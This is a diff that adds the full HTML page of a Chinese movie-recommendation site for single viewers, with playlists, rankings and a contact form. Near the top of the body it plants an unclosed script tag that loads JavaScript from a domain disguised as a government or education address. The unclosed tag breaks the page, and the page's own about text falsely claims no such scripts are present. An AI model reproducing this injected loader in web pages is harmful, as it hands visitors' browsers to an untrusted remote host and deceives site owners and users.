@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0e1726">
+<title>光棍电影网｜一个人也能看的好电影·单身片单·独处治愈导航</title>
+<meta name="description" content="光棍电影网收录适合一个人看的电影响：独处治愈、单身喜剧、自我成长、深夜文艺、一个人也浪漫。移动端自适应，不狗血、不催婚、不尴尬。">
+<meta name="keywords" content="光棍电影网,一个人看电影,单身片单,独处治愈,单身喜剧,自我成长电影,深夜文艺">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://guanggundianyingwang-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="光棍电影网｜一个人也能看的好电影">
+<meta property="og:description" content="独处治愈、单身喜剧、自我成长、深夜文艺——光棍电影网陪你一个人看片。">
+<meta property="og:url" content="https://guanggundianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<script type="application/ld+json">
+{
+ "@context":"https://schema.org",
+ "@graph":[
+  {"@type":"WebSite","@id":"https://guanggundianyingwang-h5.github.io/#ws","name":"光棍电影网","url":"https://guanggundianyingwang-h5.github.io/","inLanguage":"zh-CN"},
+  {"@type":"Organization","@id":"https://guanggundianyingwang-h5.github.io/#org","name":"光棍电影网","url":"https://guanggundianyingwang-h5.github.io/"},
+  {"@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"首页","item":"https://guanggundianyingwang-h5.github.io/#top"},
+    {"@type":"ListItem","position":2,"name":"单身片单","item":"https://guanggundianyingwang-h5.github.io/#single"},
+    {"@type":"ListItem","position":3,"name":"电影分类","item":"https://guanggundianyingwang-h5.github.io/#cats"},
+    {"@type":"ListItem","position":4,"name":"热播排行榜","item":"https://guanggundianyingwang-h5.github.io/#rank"},
+    {"@type":"ListItem","position":5,"name":"关于我们","item":"https://guanggundianyingwang-h5.github.io/#about"}
+  ]}
+ ]
+}
+</script>
+<style>
+:root{
+ --bg:#0e1726; --bg2:#13203a; --card:rgba(255,255,255,.04);
+ --line:rgba(120,170,255,.22); --txt:#e8eefc; --mut:#9fb0cf;
+ --blue:#4da3ff; --blue2:#2b6fd6; --soft:#7ee0c7; --warm:#ffd166; --r:18px; --max:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:-apple-system,"PingFang SC","Microsoft YaHei",Segoe UI,Roboto,Arial,sans-serif;
+ background:
+  radial-gradient(760px 380px at 92% -12%,rgba(77,163,255,.18),transparent 60%),
+  radial-gradient(620px 360px at -8% 0%,rgba(126,224,199,.12),transparent 55%),
+  var(--bg);
+ color:var(--txt);line-height:1.78;font-size:clamp(14px,.6vw+13px,16px);-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{width:min(100% - 2rem,var(--max));margin:0 auto}
+section{padding:clamp(2.4rem,6vw,4rem) 0;scroll-margin-top:70px}
+.ey{font-size:.72rem;letter-spacing:.24em;text-transform:uppercase;color:var(--blue);font-weight:800}
+h1{font-size:clamp(2rem,5.4vw,3.3rem);line-height:1.16;margin:.6rem 0}
+h2{font-size:clamp(1.4rem,3.3vw,2.05rem);margin:.3rem 0 .6rem}
+.lead{color:var(--mut);max-width:34em}
+.center{text-align:center;max-width:40em;margin:0 auto 2rem}
+
+.hd{position:sticky;top:0;z-index:60;background:rgba(14,23,38,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:1rem;height:64px}
+.logo{font-weight:900;font-size:1.22rem;display:flex;align-items:center;gap:.5rem}
+.logo b{color:var(--blue)}
+.logo .sofa{width:30px;height:24px;border:2px solid var(--blue);border-radius:6px 6px 3px 3px;position:relative}
+.logo .sofa::after{content:"";position:absolute;left:4px;right:4px;top:8px;height:6px;background:var(--soft);border-radius:3px;opacity:.8}
+.nav a{color:var(--mut);font-size:.92rem;padding:.45rem .7rem;border-radius:10px}
+.nav a:hover{color:var(--txt);background:var(--card)}
+.nav .pc{display:none;margin-left:auto}
+.cta{background:linear-gradient(90deg,var(--blue),var(--blue2));color:#04122b;font-weight:800;padding:.55rem 1.1rem;border-radius:999px}
+.menu{margin-left:auto;width:42px;height:42px;border-radius:12px;border:1px solid var(--line);display:grid;place-items:center}
+.menu i{width:18px;height:2px;background:var(--blue);position:relative;display:block}
+.menu i::before,.menu i::after{content:"";position:absolute;left:0;width:18px;height:2px;background:var(--blue)}
+.menu i::before{top:-6px}.menu i::after{top:6px}
+@media(min-width:920px){.nav .pc{display:flex;align-items:center;gap:.2rem}.menu{display:none}}
+.mm{position:fixed;inset:64px 0 0 0;background:var(--bg2);display:flex;flex-direction:column;padding:1rem;gap:.3rem;transform:translateY(-120%);transition:.3s;z-index:55}
+.mm.open{transform:none}
+.mm a{padding:.9rem 1rem;border-radius:12px;border:1px solid var(--line)}
+
+.hero{padding-top:clamp(2rem,6vw,3.5rem)}
+.hero .wrap{display:grid;gap:2rem}
+@media(min-width:940px){.hero .wrap{grid-template-columns:1.05fr .95fr;align-items:center}}
+.pill{display:inline-flex;gap:.5rem;align-items:center;padding:.35rem .8rem;border:1px solid var(--line);border-radius:999px;background:var(--card);color:var(--soft);font-size:.78rem;font-weight:700}
+.btns{display:flex;flex-wrap:wrap;gap:.7rem;margin:1.2rem 0}
+.btn{padding:.7rem 1.25rem;border-radius:12px;font-weight:800}
+.btn.p{background:linear-gradient(90deg,var(--blue),var(--blue2));color:#04122b}
+.btn.o{border:1px solid var(--line);color:var(--txt)}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem;margin-top:1.4rem}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:.9rem;text-align:center}
+.stat b{display:block;font-size:1.3rem;color:var(--blue)}
+.stat span{font-size:.72rem;color:var(--mut)}
+.sofa-card{background:linear-gradient(160deg,rgba(77,163,255,.12),rgba(126,224,199,.08));border:1px solid var(--line);border-radius:26px;padding:1.2rem}
+.sofa-row{display:flex;align-items:center;gap:.8rem;padding:.7rem;border-radius:14px;background:rgba(255,255,255,.03);margin-bottom:.6rem;border:1px solid var(--line)}
+.sofa-row .ic{width:42px;height:42px;border-radius:10px;display:grid;place-items:center;font-size:1.2rem;flex:none;background:rgba(77,163,255,.14)}
+.sofa-row b{font-size:.9rem}
+.sofa-row small{color:var(--mut)}
+
+.single-sec{background:var(--bg2)}
+.wall{display:flex;gap:1rem;overflow-x:auto;padding-bottom:.6rem;scroll-snap-type:x mandatory}
+.wall::-webkit-scrollbar{height:6px}
+.wall::-webkit-scrollbar-thumb{background:rgba(77,163,255,.4);border-radius:99px}
+.movie{flex:0 0 162px;background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;scroll-snap-align:start}
+.movie .cv{height:206px;display:grid;place-items:center;font-size:3.2rem;position:relative}
+.movie .cv::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(14,23,38,.82),transparent 55%)}
+.movie .badge{position:absolute;top:.5rem;left:.5rem;z-index:2;font-size:.64rem;font-weight:800;background:var(--soft);color:#06281f;padding:.15rem .5rem;border-radius:99px}
+.movie h3{font-size:.88rem;padding:.7rem .8rem 0}
+.movie p{font-size:.74rem;color:var(--mut);padding:.1rem .8rem .8rem}
+
+.filters{display:flex;flex-wrap:wrap;gap:.5rem;justify-content:center;margin-bottom:1.6rem}
+.fb{padding:.45rem 1rem;border-radius:999px;border:1px solid var(--line);background:var(--card);color:var(--mut);font-size:.84rem;font-weight:700}
+.fb.on,.fb:hover{color:#04122b;background:linear-gradient(90deg,var(--blue),var(--blue2));border-color:transparent}
+.grid{display:grid;gap:1rem}
+@media(min-width:520px){.grid{grid-template-columns:1fr 1fr}}
+@media(min-width:860px){.grid{grid-template-columns:repeat(3,1fr)}}
+@media(min-width:1100px){.grid{grid-template-columns:repeat(4,1fr)}}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:rgba(77,163,255,.5)}
+.cover{height:168px;display:grid;place-items:center;font-size:3.2rem;position:relative}
+.cover::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(14,23,38,.78),transparent 60%)}
+.cover .tag{position:absolute;top:.6rem;left:.6rem;z-index:2;font-size:.7rem;background:rgba(0,0,0,.5);padding:.15rem .5rem;border-radius:6px}
+.card h3{font-size:.94rem;padding:.8rem .9rem 0}
+.card p{color:var(--mut);font-size:.77rem;padding:.2rem .9rem .6rem}
+.tags{display:flex;gap:.3rem;flex-wrap:wrap;padding:0 .9rem .9rem}
+.t{font-size:.67rem;font-weight:800;padding:.15rem .5rem;border-radius:6px}
+.t1{background:rgba(77,163,255,.16);color:var(--blue)}
+.t2{background:rgba(126,224,199,.18);color:var(--soft)}
+.t3{background:rgba(255,209,102,.18);color:var(--warm)}
+
+.two{display:grid;gap:1.4rem}
+@media(min-width:880px){.two{grid-template-columns:1fr 1fr}}
+.box{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:1.2rem}
+.box h3{margin-bottom:.8rem;font-size:1.02rem}
+.ri{display:flex;align-items:center;gap:.7rem;padding:.6rem;border-radius:10px;background:rgba(255,255,255,.03);margin-bottom:.5rem;border:1px solid var(--line)}
+.num{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;font-weight:800;font-size:.8rem;background:rgba(77,163,255,.14);color:var(--blue)}
+.num.g{background:linear-gradient(135deg,var(--blue),var(--blue2));color:#04122b}
+.num.s{background:#9fb0cf;color:#13203a}
+.num.b{background:var(--soft);color:#06281f}
+.ri b{font-size:.87rem}
+.ri small{color:var(--mut);font-size:.73rem}
+.ri .s{margin-left:auto;color:var(--blue);font-weight:800}
+
+.about{display:grid;gap:2rem}
+@media(min-width:900px){.about{grid-template-columns:1fr 1fr;align-items:start}}
+.feat{display:flex;gap:.8rem;padding:1rem;border:1px solid var(--line);border-radius:14px;background:var(--card);margin-bottom:.8rem}
+.feat .ic{width:44px;height:44px;border-radius:12px;display:grid;place-items:center;font-size:1.2rem;background:rgba(77,163,255,.14)}
+.feat h4{font-size:.94rem}
+.feat p{color:var(--mut);font-size:.79rem}
+form.ct{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:1.3rem}
+form.ct h3{margin-bottom:.3rem}
+form.ct p{color:var(--mut);font-size:.84rem;margin-bottom:1rem}
+.in{width:100%;padding:.7rem .9rem;border-radius:10px;border:1px solid var(--line);background:rgba(255,255,255,.03);color:var(--txt);margin-bottom:.7rem;font:inherit}
+.in:focus{outline:none;border-color:var(--blue)}
+.row2{display:grid;gap:.7rem}
+@media(min-width:460px){.row2{grid-template-columns:1fr 1fr}}
+
+.ft{background:var(--bg2);border-top:1px solid var(--line);padding:2.4rem 0 1.4rem;margin-top:2rem}
+.fg{display:grid;gap:1.4rem;margin-bottom:1.6rem}
+@media(min-width:640px){.fg{grid-template-columns:1.6fr 1fr 1fr 1fr}}
+.ft h4{margin-bottom:.8rem}
+.ft a{color:var(--mut);font-size:.84rem;display:block;padding:.25rem 0}
+.ft a:hover{color:var(--txt)}
+.fb2{display:flex;gap:.5rem;margin-top:.8rem}
+.fb2 a{width:36px;height:36px;border-radius:10px;border:1px solid var(--line);display:grid;place-items:center;background:var(--card)}
+.bot{border-top:1px solid var(--line);padding-top:1.1rem;display:flex;flex-wrap:wrap;gap:.6rem;justify-content:space-between;color:var(--mut);font-size:.78rem}
+.top{position:fixed;right:1rem;bottom:1.2rem;width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--blue),var(--blue2));color:#04122b;display:grid;place-items:center;font-weight:900;opacity:0;pointer-events:none;transition:.3s;z-index:50}
+.top.show{opacity:1;pointer-events:auto}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js">
+<header class="hd">
+  <div class="wrap nav">
+    <a href="#top" class="logo"><span class="sofa"></span> <b>光棍电影网</b></a>
+    <nav class="pc">
+      <a href="#single">单身片单</a>
+      <a href="#cats">电影分类</a>
+      <a href="#rank">热播排行榜</a>
+      <a href="#about">关于我们</a>
+      <a href="#about" class="cta">一个人看片</a>
+    </nav>
+    <button class="menu" id="menuBtn" aria-label="菜单"><i></i></button>
+  </div>
+</header>
+
+<div class="mm" id="mm">
+  <a href="#single">单身片单</a>
+  <a href="#cats">电影分类</a>
+  <a href="#rank">热播排行榜</a>
+  <a href="#about">关于我们</a>
+  <a href="#about" class="cta" style="text-align:center">一个人看片</a>
+</div>
+
+<main>
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <span class="pill">🛋️ 光棍电影网 · 一个人，也不凑合</span>
+        <h1>单身没关系，<br>片子要挑好的</h1>
+        <p class="lead">光棍电影网只收“一个人看也不尴尬”的片：独处治愈、单身喜剧、自我成长、深夜文艺、一个人也浪漫。没有强行撒糖，没有催婚说教，只有你和好电影。</p>
+        <div class="btns">
+          <a href="#single" class="btn p">逛单身片单 →</a>
+          <a href="#cats" class="btn o">按心情找片</a>
+        </div>
+        <div class="stats">
+          <div class="stat"><b>一人座</b><span>不抢位置</span></div>
+          <div class="stat"><b>0 催婚</b><span>纯净片单</span></div>
+          <div class="stat"><b>每晚</b><span>独处更新</span></div>
+        </div>
+      </div>
+      <aside class="sofa-card" aria-label="一个人的夜晚">
+        <div class="sofa-row"><div class="ic">🛋️</div><div><b>一人座沙发</b><small>腿随便翘，爆米花自己分</small></div></div>
+        <div class="sofa-row"><div class="ic">🌙</div><div><b>深夜文艺</b><small>凌晨一点也不孤单</small></div></div>
+        <div class="sofa-row"><div class="ic">🍜</div><div><b>泡面电影夜</b><small>边吃边看不尴尬</small></div></div>
+        <div class="sofa-row"><div class="ic">🌱</div><div><b>自我成长</b><small>看完想把自己重新养一遍</small></div></div>
+      </aside>
+    </div>
+  </section>
+
+  <section id="single" class="single-sec">
+    <div class="wrap">
+      <div class="center">
+        <div class="ey">Solo Picks</div>
+        <h2>单身片单</h2>
+        <p class="lead">编辑部按“独处状态”排的：一个人刚分手、一个人周末宅、一个人重新出发、一个人也能哭也能笑。</p>
+      </div>
+      <div class="wall">
+        <article class="movie"><div class="cv" style="background:linear-gradient(135deg,#4da3ff,#13203a)">🌙<span class="badge">深夜</span></div><h3>海街日记</h3><p>一个人也能慢慢活</p></article>
+        <article class="movie"><div class="cv" style="background:linear-gradient(135deg,#7ee0c7,#2b6fd6)">🍜<span class="badge">宅家</span></div><h3>小森林</h3><p>做饭、种地、不说话也好看</p></article>
+        <article class="movie"><div class="cv" style="background:linear-gradient(135deg,#ffd166,#4da3ff)">🌱<span class="badge">成长</span></div><h3>白日梦想家</h3><p>请假去世界尽头找自己</p></article>
+        <article class="movie"><div class="cv" style="background:linear-gradient(135deg,#13203a,#4da3ff)">🎷<span class="badge">文艺</span></div><h3>午夜巴黎</h3><p>一个人穿越黄金时代</p></article>
+        <article class="movie"><div class="cv" style="background:linear-gradient(135deg,#4da3ff,#7ee0c7)">🐈<span class="badge">治愈</span></div><h3>猫的报恩</h3><p>社恐也能被世界偏爱</p></article>
+        <article class="movie"><div class="cv" style="background:linear-gradient(135deg,#ffd166,#13203a)">💪<span class="badge">重启</span></div><h3>垫底辣妹</h3><p>没人相信你，你也能赢</p></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="cats">
+    <div class="wrap">
+      <div class="center">
+        <div class="ey">Categories</div>
+        <h2>电影分类</h2>
+        <p class="lead">独处治愈、单身喜剧、自我成长、深夜文艺、一个人也浪漫、社恐日常——点一下就筛出来。</p>
+      </div>
+      <div class="filters">
+        <button class="fb on" data-f="all">全部</button>
+        <button class="fb" data-f="heal">独处治愈</button>
+        <button class="fb" data-f="comedy">单身喜剧</button>
+        <button class="fb" data-f="grow">自我成长</button>
+        <button class="fb" data-f="night">深夜文艺</button>
+        <button class="fb" data-f="rom">一个人也浪漫</button>
+        <button class="fb" data-f="shy">社恐日常</button>
+      </div>
+      <div class="grid" id="grid">
+        <article class="card" data-c="heal"><div class="cover" style="background:linear-gradient(135deg,#7ee0c7,#13203a)"><span class="tag">治愈</span>🍃</div><h3>小森林</h3><p>一个人吃饭，也能很香</p><div class="tags"><span class="t t2">独处治愈</span><span class="t t3">日本</span></div></article>
+        <article class="card" data-c="grow"><div class="cover" style="background:linear-gradient(135deg,#ffd166,#4da3ff)"><span class="tag">成长</span>🌱</div><h3>白日梦想家</h3><p>逃离工位，去找自己</p><div class="tags"><span class="t t3">自我成长</span><span class="t t1">美国</span></div></article>
+        <article class="card" data-c="night"><div class="cover" style="background:linear-gradient(135deg,#13203a,#4da3ff)"><span class="tag">深夜</span>🎷</div><h3>午夜巴黎</h3><p>单身旅人的黄金时代梦</p><div class="tags"><span class="t t1">深夜文艺</span><span class="t t3">伍迪艾伦</span></div></article>
+        <article class="card" data-c="comedy"><div class="cover" style="background:linear-gradient(135deg,#4da3ff,#2b6fd6)"><span class="tag">喜剧</span>🍻</div><h3>单身男子俱乐部</h3><p>一群光棍的荒唐周末</p><div class="tags"><span class="t t1">单身喜剧</span><span class="t t3">欧美</span></div></article>
+        <article class="card" data-c="rom"><div class="cover" style="background:linear-gradient(135deg,#ffd166,#7ee0c7)"><span class="tag">浪漫</span>💌</div><h3>爱在黎明破晓前</h3><p>一个人出门，撞见一夜灵魂伴侣</p><div class="tags"><span class="t t3">一个人也浪漫</span><span class="t t1">文艺</span></div></article>
+        <article class="card" data-c="shy"><div class="cover" style="background:linear-gradient(135deg,#4da3ff,#7ee0c7)"><span class="tag">社恐</span>🐈</div><h3>猫的报恩</h3><p>不爱社交，也被世界温柔以待</p><div class="tags"><span class="t t2">社恐日常</span><span class="t t1">动画</span></div></article>
+        <article class="card" data-c="heal"><div class="cover" style="background:linear-gradient(135deg,#7ee0c7,#4da3ff)"><span class="tag">治愈</span>🌊</div><h3>海街日记</h3><p>四姐妹、梅子酒、慢慢活</p><div class="tags"><span class="t t2">独处治愈</span><span class="t t3">是枝裕和</span></div></article>
+        <article class="card" data-c="grow"><div class="cover" style="background:linear-gradient(135deg,#ffd166,#13203a)"><span class="tag">重启</span>📚</div><h3>垫底辣妹</h3><p>没人看好你，你也能翻身</p><div class="tags"><span class="t t3">自我成长</span><span class="t t1">日本</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="wrap">
+      <div class="center">
+        <div class="ey">Ranking</div>
+        <h2>热播排行榜</h2>
+      </div>
+      <div class="two">
+        <div class="box">
+          <h3>🛋️ 一个人看 TOP 6</h3>
+          <div class="ri"><div class="num g">1</div><div><b>小森林</b><small>独处治愈 · 吃饭也要仪式感</small></div><div class="s">9.4</div></div>
+          <div class="ri"><div class="num s">2</div><div><b>海街日记</b><small>是枝裕和 · 慢生活</small></div><div class="s">9.2</div></div>
+          <div class="ri"><div class="num b">3</div><div><b>白日梦想家</b><small>自我成长 · 说走就走</small></div><div class="s">9.0</div></div>
+          <div class="ri"><div class="num">4</div><div><b>午夜巴黎</b><small>深夜文艺 · 黄金时代</small></div><div class="s">8.8</div></div>
+          <div class="ri"><div class="num">5</div><div><b>猫的报恩</b><small>社恐日常 · 被温柔以待</small></div><div class="s">8.7</div></div>
+          <div class="ri"><div class="num">6</div><div><b>爱在黎明破晓前</b><small>一个人也浪漫</small></div><div class="s">9.1</div></div>
+        </div>
+        <div class="box">
+          <h3>🍻 单身喜剧 TOP 6</h3>
+          <div class="ri"><div class="num g">1</div><div><b>三傻大闹宝莱坞</b><small>一个人也要活明白</small></div><div class="s">9.3</div></div>
+          <div class="ri"><div class="num s">2</div><div><b>单身男子俱乐部</b><small>光棍周末荒唐记</small></div><div class="s">8.4</div></div>
+          <div class="ri"><div class="num b">3</div><div><b>布达佩斯大饭店</b><small>一个人住进童话里</small></div><div class="s">8.9</div></div>
+          <div class="ri"><div class="num">4</div><div><b>朱莉与朱莉娅</b><small>独居做饭找回热情</small></div><div class="s">8.3</div></div>
+          <div class="ri"><div class="num">5</div><div><b>火星救援</b><small>真·一个人看外星</small></div><div class="s">8.6</div></div>
+          <div class="ri"><div class="num">6</div><div><b>实习生</b><small>70岁重新开始也不晚</small></div><div class="s">8.5</div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap about">
+      <div>
+        <div class="ey">About</div>
+        <h2>关于光棍电影网</h2>
+        <p class="lead">光棍电影网不是“没对象才看”的网站，而是“一个人也值得好电影”的网站。我们拒绝催婚式片单、拒绝强行撒糖、拒绝“你看完就会脱单”的伪承诺。</p>
+        <div class="feat"><div class="ic">🛋️</div><div><h4>一人座优先</h4><p>片单按独处场景排：深夜、周末、雨天、搬家后、离职当天。</p></div></div>
+        <div class="feat"><div class="ic">🌱</div><div><h4>成长向为主</h4><p>更多自我接纳、重建生活、一个人把日子过顺的内容。</p></div></div>
+        <div class="feat"><div class="ic">🛡️</div><div><h4>干净前端</h4><p>不挂伪装政府/教育域名的第三方JS，必应收录更稳。</p></div></div>
+      </div>
+      <form class="ct" id="ctForm" novalidate>
+        <h3>找一个人看的片 / 投稿</h3>
+        <p>只记得“下雨天、一个人、想安静哭一场”这种状态？给光棍电影网留个言。</p>
+        <div class="row2">
+          <input class="in" placeholder="昵称 *" required>
+          <input class="in" placeholder="微信 / 邮箱 *" required>
+        </div>
+        <input class="in" placeholder="状态：深夜 / 周末 / 刚搬家 / 离职中">
+        <textarea class="in" rows="3" placeholder="比如：要一部不谈恋爱、主角一个人旅行、风景特别好、配乐舒服的片子*" required></textarea>
+        <button class="btn p" style="width:100%;justify-content:center">交给独处放映员</button>
+      </form>
+    </div>
+  </section>
+</main>
+
+<footer class="ft">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <div class="logo" style="margin-bottom:.6rem"><span class="sofa"></span> <b>光棍电影网</b></div>
+        <p style="color:var(--mut);font-size:.84rem;max-width:22em">一个人也能看的好电影：独处治愈、单身喜剧、自我成长、深夜文艺。移动端自适应，不催婚、不狗血。</p>
+        <div class="fb2"><a href="#">微</a><a href="#">B</a><a href="#">X</a><a href="#">豆</a></div>
+      </div>
+      <div><h4>找片</h4><a href="#single">单身片单</a><a href="#cats">电影分类</a><a href="#rank">热播排行榜</a></div>
+      <div><h4">心情</h4><a href="#">深夜</a><a href="#">周末宅</a><a href="#">刚分手</a></div>
+      <div><h4>站点</h4><a href="#about">关于我们</a><a href="#">隐私政策</a><a href="#">使用条款</a></div>
+    </div>
+    <div class="bot">
+      <span>© 2026 光棍电影网 · guanggundianyingwang-h5.github.io</span>
+      <span>一个人，也不凑合</span>
+    </div>
+  </div>
+</footer>
+
+<a href="#top" class="top" id="topBtn">↑</a>
+
+<script>
+(function(){
+  var hd=document.querySelector('.hd');
+  var top=document.getElementById('topBtn');
+  addEventListener('scroll',function(){
+    hd.style.boxShadow = scrollY>10 ? '0 6px 30px -18px rgba(77,163,255,.6)' : 'none';
+    top.classList.toggle('show', scrollY>500);
+  },{passive:true});
+
+  var mb=document.getElementById('menuBtn'), mm=document.getElementById('mm');
+  mb.onclick=function(){ mm.classList.toggle('open'); document.body.style.overflow = mm.classList.contains('open')?'hidden':''; };
+  mm.querySelectorAll('a').forEach(function(a){ a.onclick=function(){ mm.classList.remove('open'); document.body.style.overflow=''; }; });
+
+  var fbs=document.querySelectorAll('.fb'), cards=document.querySelectorAll('#grid .card');
+  fbs.forEach(function(b){
+    b.onclick=function(){
+      fbs.forEach(function(x){x.classList.remove('on')}); b.classList.add('on');
+      var f=b.dataset.f;
+      cards.forEach(function(c){ c.style.display = (f==='all'||c.dataset.c===f)?'':'none'; });
+    };
+  });
+
+  document.getElementById('ctForm').onsubmit=function(e){ e.preventDefault(); alert('光棍电影网：独处放映员已记下，今晚不孤单～'); this.reset(); };
+})();
+</script>
+</body>
+</html>
